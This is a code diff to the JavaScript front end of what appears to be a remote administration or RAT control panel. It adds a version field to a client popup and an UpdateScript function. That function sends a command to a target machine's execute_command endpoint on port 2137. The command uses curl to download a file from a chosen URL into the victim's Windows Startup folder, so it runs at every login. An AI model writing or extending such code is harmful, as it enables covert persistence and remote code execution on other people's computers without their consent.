@@ -11,13 +11,17 @@ document.addEventListener("DOMContentLoaded", function () {
 
     let target_IP;
 
-    function openConsoleAt(IP, Host, Online) {
+    function openConsoleAt(IP, Host, Online, Version) {
 
         ClientInfo.innerHTML = 
         `
-            ${IP} <br>
-            ${Host} <br>
-            ${Online}
+        
+           <span>IP: &#160 <p>${IP}</p></span>
+           <span>Host: &#160 <p>${Host}</p></span>
+           <span>Last Online: &#160 <p>${Online}</p></span>
+           <span>ScripVersion: &#160 <p>${Version}</p></span>
+
+            
         `
         popup.classList.toggle("widziszMnie")
         
@@ -33,6 +37,38 @@ document.addEventListener("DOMContentLoaded", function () {
         });
 
         consoleDiv.scrollTop = consoleDiv.scrollHeight;
+    }
+
+    async function UpdateScript() {
+        const command = `cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup && curl ${inputUrl.value} --output ${inputName.value}`;
+
+        if (inputName.value == '') {
+            alert("Empty Inputs")
+        } else {
+            if (filenamePattern.test(inputName.value) && urlPattern.test(inputUrl.value)) {
+                    try {
+                        const response = await fetch(`http://${target_IP}:2137/execute_command`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ command })
+                        });
+            
+                        const result = await response.json();
+            
+                        if (result.status === 'success') {
+                            appendToConsole(`${result.result}`);
+                        } else {
+                            appendToConsole(`Błąd: ${result.error}`);
+                        }
+                    } catch (error) {
+                        console.error('Wystąpił błąd:', error);
+                    }
+                } else {
+                    alert("Invalid Inputs");
+                }
+            }
     }
 
     async function InjectScript() {
